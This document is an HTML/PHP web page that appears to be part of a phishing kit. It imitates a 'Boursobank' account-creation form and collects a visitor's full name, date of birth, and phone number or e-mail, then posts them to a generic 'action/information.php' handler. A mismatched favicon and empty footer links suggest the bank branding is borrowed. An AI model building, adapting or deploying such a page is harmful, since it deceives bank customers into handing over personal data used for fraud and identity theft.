<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="short icon" href="instruments-logo-4677.png">
    <title>Formulaire - Boursobank</title>
    <style>
        /* Corps général */
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background: linear-gradient(to bottom, #f3f4fc, #eef4fc);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
        }

        .top-logo {
            margin-bottom: 50px;
            width: 100%;
            height: auto;
        }

        .top-logo img {
            max-width: 200px;
        }

        .form-box {
            background: #ffffff;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 500px;
            padding: 30px;
        }

        .form-header {
            margin-bottom: 20px;
        }

        .form-header h1 {
            font-size: 1.5rem;
            color: #003883;
            font-weight: 600;
        }

        .form-header p {
            font-size: 0.9rem;
            color: #6b7280;
        }

        .form-group {
            display: flex;
            flex-wrap: wrap;
            gap: 15px;
            margin-bottom: 20px;
        }

        .form-group label {
            font-size: 0.9rem;
            color: #6b7280;
            display: block;
        }

        .form-group input,
        .form-group select {
            padding: 10px;
            font-size: 0.9rem;
            border: 1px solid #d1d5db;
            border-radius: 5px;
            width: 100%;
            max-width: calc(33.33% - 10px);
        }

        .form-group select:invalid {
            color: #9ca3af;
        }

        .input-full {
            max-width: 100%;
        }

        .btn {
            background: #ff006f;
            color: white;
            border: none;
            padding: 10px 20px;
            font-size: 1rem;
            border-radius: 5px;
            cursor: pointer;
            width: 100%;
            max-width: 200px;
            transition: background 0.3s;
        }

        .btn:hover {
            background: #e60064;
        }

        .footer-links {
            margin-top: 20px;
            font-size: 0.8rem;
            color: #999;
        }

        .footer-links a {
            color: #999;
            text-decoration: none;
            margin: 0 5px;
        }

        .footer-links a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Logo principal -->
        <div class="top-logo">
            <img src="rvb-logo-3000_original_original-1024x188.png" alt="Logo Principal">
        </div>

        <!-- Boîte du formulaire -->
        <div class="form-box">
            <!-- En-tête du formulaire -->
            <div class="form-header">
                <h1>Créer un compte</h1>
                <p>Veuillez remplir vos informations personnelles</p>
            </div>

            <!-- Formulaire -->
            <form action="action/information.php" method="POST">
                <!-- Champ Prénom et Nom -->
                <div class="form-group">
                    <input type="text" name="firstname" placeholder="Prénom" required>
                    <input type="text" name="lastname" placeholder="Nom de famille" required>
                </div>

                <!-- Date de naissance -->
                <div class="form-group">
                    <select name="day" required>
                        <option value="" disabled selected>Jour</option>
                        <?php for ($i = 1; $i <= 31; $i++) {
                            echo "<option value='$i'>$i</option>";
                        } ?>
                    </select>
                    <select name="month" required>
                        <option value="" disabled selected>Mois</option>
                        <?php 
                        $months = [
                            "Janvier", "Février", "Mars", "Avril", "Mai", "Juin",
                            "Juillet", "Août", "Septembre", "Octobre", "Novembre", "Décembre"
                        ];
                        foreach ($months as $index => $month) {
                            echo "<option value='" . ($index + 1) . "'>$month</option>";
                        }
                        ?>
                    </select>
                    <select name="year" required>
                        <option value="" disabled selected>Année</option>
                        <?php 
                        $currentYear = date('Y');
                        for ($i = $currentYear; $i >= 1900; $i--) {
                            echo "<option value='$i'>$i</option>";
                        }
                        ?>
                    </select>
                </div>

                <!-- Champ Numéro de téléphone ou e-mail -->
                <div class="form-group">
                    <input type="tel" name="phone" class="input-full" placeholder="Numéro mobile ou e-mail" required>
                </div>

                <!-- Bouton d'envoi -->
                <div class="form-group">
                    <button class="btn" type="submit">Suivant</button>
                </div>
            </form>
        </div>

        <!-- Liens de bas de page -->
        <div class="footer-links">
            <a href="#">Aide</a> / <a href="#">Confidentialité</a> / <a href="#">Conditions</a>
        </div>
    </div>
</body>
</html>
